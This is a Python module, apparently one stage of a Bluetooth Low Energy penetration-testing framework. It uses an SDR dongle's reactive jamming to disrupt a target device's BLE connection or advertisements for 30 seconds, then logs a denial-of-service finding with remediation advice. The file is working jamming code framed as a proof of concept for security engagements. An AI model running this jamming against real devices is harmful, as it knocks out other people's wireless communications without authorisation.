from datetime import datetime, timezone
from time import time, sleep

from core.dongle import WhadDongle
from core.models import Target, Connection, Finding
from core.db import insert_finding
from core.logger import get_logger
import config

log = get_logger("s4_jam")

JAM_DURATION = 30


def run(
    dongle: WhadDongle,
    jam_target,
    engagement_id: str,
) -> None:
    if not dongle.caps.can_reactive_jam:
        log.warning(
            "Dongle does not support reactive_jam — Stage 4 skipped. "
            "ButteRFly firmware v1.1+ required."
        )
        return

    is_connection = isinstance(jam_target, Connection)

    if is_connection:
        target_addr = jam_target.peripheral_addr
        aa = jam_target.access_address
        jam_mode = "connection"
        log.info(
            f"Reactive jamming connection: "
            f"{jam_target.central_addr} <-> {target_addr}  "
            f"AA=0x{aa:08X}"
        )
    else:
        target_addr = jam_target.bd_address
        aa = None
        jam_mode = "advertising"
        log.info(
            f"Reactive jamming advertisements: {target_addr}"
        )

    connector = dongle.ble_connector()
    packets_jammed = 0
    connection_disrupted = False

    try:
        if jam_mode == "connection" and aa is not None:
            try:
                connector.reactive_jam(
                    channel=37,
                    pattern=aa.to_bytes(4, "little"),
                    position=0,
                )
                log.info(
                    f"Reactive jam started on AA=0x{aa:08X}"
                )
            except Exception as exc:
                log.warning(
                    f"Connection-level reactive jam not supported: "
                    f"{exc}. Falling back to advertisement jam."
                )
                jam_mode = "advertising"
                _start_adv_jam(connector, target_addr)
        else:
            _start_adv_jam(connector, target_addr)

        connector.start()

        deadline = time() + JAM_DURATION
        while time() < deadline:
            sleep(1.0)
            elapsed = int(time() - (deadline - JAM_DURATION))
            if elapsed % 10 == 0 and elapsed > 0:
                log.info(f"Jamming in progress... {elapsed}s")

    except KeyboardInterrupt:
        log.info("Jamming interrupted by user.")
    except Exception as exc:
        log.error(f"Jamming error: {exc}")
    finally:
        try:
            connector.stop()
        except Exception:
            pass

    finding = Finding(
        type="denial_of_service",
        severity="high",
        target_addr=target_addr,
        description=(
            f"Reactive jamming PoC executed against "
            f"{target_addr} in {jam_mode} mode for "
            f"{JAM_DURATION}s. BLE {jam_mode} traffic for "
            f"this device was disrupted using a low-cost "
            f"SDR dongle."
        ),
        remediation=(
            "BLE jamming cannot be prevented at the protocol "
            "level. Mitigations include: frequency hopping "
            "monitoring, redundant communication paths, "
            "physical RF shielding for critical infrastructure, "
            "and out-of-band alerting when BLE connectivity is "
            "lost."
        ),
        evidence={
            "target_addr": target_addr,
            "access_address": aa,
            "jam_mode": jam_mode,
            "duration_seconds": JAM_DURATION,
            "packets_jammed": packets_jammed,
            "connection_disrupted": connection_disrupted,
        },
        engagement_id=engagement_id,
    )
    insert_finding(finding)

    log.info(
        f"FINDING [high] denial_of_service: "
        f"{target_addr} ({jam_mode}, {JAM_DURATION}s)"
    )

    _print_summary(target_addr, jam_mode, JAM_DURATION)


def _start_adv_jam(connector, target_addr: str) -> None:
    addr_bytes = bytes.fromhex(target_addr.replace(":", ""))
    try:
        connector.reactive_jam(
            channel=37,
            pattern=addr_bytes,
            position=2,
        )
        log.info(
            f"Advertisement reactive jam started for {target_addr}"
        )
    except Exception as exc:
        log.warning(f"reactive_jam call failed: {exc}")
        raise


def _print_summary(
    target_addr: str, jam_mode: str, duration: int
) -> None:
    print("\n" + "-" * 72)
    print("  STAGE 4 SUMMARY -- Reactive Jamming PoC")
    print("-" * 72)
    print(f"  Target          : {target_addr}")
    print(f"  Mode            : {jam_mode}")
    print(f"  Duration        : {duration}s")
    print("-" * 72 + "\n")